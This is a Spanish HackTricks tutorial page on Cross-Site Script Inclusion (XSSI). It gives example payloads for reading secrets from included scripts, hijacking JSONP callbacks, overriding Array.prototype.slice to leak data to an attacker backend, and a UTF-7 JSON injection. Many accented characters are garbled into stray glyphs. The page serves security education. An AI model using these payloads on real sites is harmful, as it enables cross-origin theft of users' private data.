# XSSI (Inclusi贸n de Script de Sitio Cruzado)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>


## Informaci贸n B谩sica

**La Inclusi贸n de Script de Sitio Cruzado (XSSI)** es una vulnerabilidad que surge de la naturaleza de la etiqueta `script` en HTML. A diferencia de la mayor铆a de los recursos, que est谩n sujetos a la **Pol铆tica de Mismo Origen (SOP)**, los scripts pueden ser incluidos desde diferentes dominios. Este comportamiento est谩 destinado a facilitar el uso de bibliotecas y otros recursos alojados en servidores diferentes, pero tambi茅n introduce un riesgo de seguridad potencial.

### Caracter铆sticas Clave de **XSSI**:
- **Bypass de SOP**: Los scripts est谩n exentos de la **Pol铆tica de Mismo Origen**, lo que les permite ser incluidos en diferentes dominios.
- **Exposici贸n de Datos**: Un atacante puede explotar este comportamiento para leer datos cargados a trav茅s de la etiqueta `script`.
- **Impacto en JavaScript Din谩mico/JSONP**: **XSSI** es particularmente relevante para JavaScript din谩mico o **JSON con Padding (JSONP)**. Estas tecnolog铆as a menudo utilizan informaci贸n de "autoridad ambiental" (como cookies) para la autenticaci贸n. Cuando se realiza una solicitud de script a un host diferente, estas credenciales (por ejemplo, cookies) se incluyen autom谩ticamente en la solicitud.
- **Fuga de Token de Autenticaci贸n**: Si un atacante puede enga帽ar al navegador de un usuario para que solicite un script desde un servidor que controlan, podr铆an acceder a informaci贸n sensible contenida en estas solicitudes.

### Tipos

1. **JavaScript Est谩tico** - Representa la forma convencional de XSSI.
2. **JavaScript Est谩tico con Autenticaci贸n** - Este tipo es distinto porque requiere autenticaci贸n para acceder.
3. **JavaScript Din谩mico** - Involucra JavaScript que genera contenido din谩micamente.
4. **No-JavaScript** - Se refiere a vulnerabilidades que no implican JavaScript directamente.

**La siguiente informaci贸n es un resumen de [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**. Consulta para m谩s detalles.


### XSSI Regular
En este enfoque, la informaci贸n privada se incrusta dentro de un archivo JavaScript de acceso global. Los atacantes pueden identificar estos archivos utilizando m茅todos como lectura de archivos, b煤squedas de palabras clave o expresiones regulares. Una vez localizado, el script que contiene informaci贸n privada puede ser incluido en contenido malicioso, permitiendo el acceso no autorizado a datos sensibles. A continuaci贸n se muestra una t茅cnica de explotaci贸n de ejemplo:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
### XSSI basado en JavaScript din谩mico y XSSI autenticado en JavaScript
Estos tipos de ataques XSSI implican que la informaci贸n confidencial se a帽ada din谩micamente al script en respuesta a la solicitud de un usuario. La detecci贸n se puede realizar enviando solicitudes con y sin cookies y comparando las respuestas. Si la informaci贸n difiere, puede indicar la presencia de informaci贸n confidencial. Este proceso se puede automatizar utilizando herramientas como la extensi贸n de Burp [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS).

Si los datos confidenciales se almacenan en una variable global, se pueden explotar utilizando m茅todos similares a los utilizados en XSSI Regular. Sin embargo, si los datos confidenciales se incluyen en una respuesta JSONP, los atacantes pueden secuestrar la funci贸n de devoluci贸n de llamada para recuperar la informaci贸n. Esto se puede hacer manipulando objetos globales o configurando una funci贸n para que sea ejecutada por la respuesta JSONP, como se muestra a continuaci贸n:
```html
<script>
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Para variables que no residen en el espacio de nombres global, a veces se puede explotar la *manipulaci贸n de prototipos*. Esta t茅cnica aprovecha el dise帽o de JavaScript, donde la interpretaci贸n del c贸digo implica recorrer la cadena de prototipos para localizar la propiedad llamada. Al sobrescribir ciertas funciones, como `slice` de `Array`, los atacantes pueden acceder y filtrar variables no globales:
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
### No-Script-XSSI
La investigaci贸n de Takeshi Terada introduce otra forma de XSSI, donde archivos No-Script, como CSV, se filtran entre or铆genes al incluirse como fuentes en una etiqueta `script`. Instancias hist贸ricas de XSSI, como el ataque de 2006 de Jeremiah Grossman para leer un libro de direcciones completo de Google y la filtraci贸n de datos JSON de Joe Walker en 2007, resaltan la gravedad de estas amenazas. Adem谩s, Gareth Heyes describe una variante de ataque que implica JSON codificado en UTF-7 para escapar del formato JSON y ejecutar scripts, efectivo en ciertos navegadores:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme en** **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
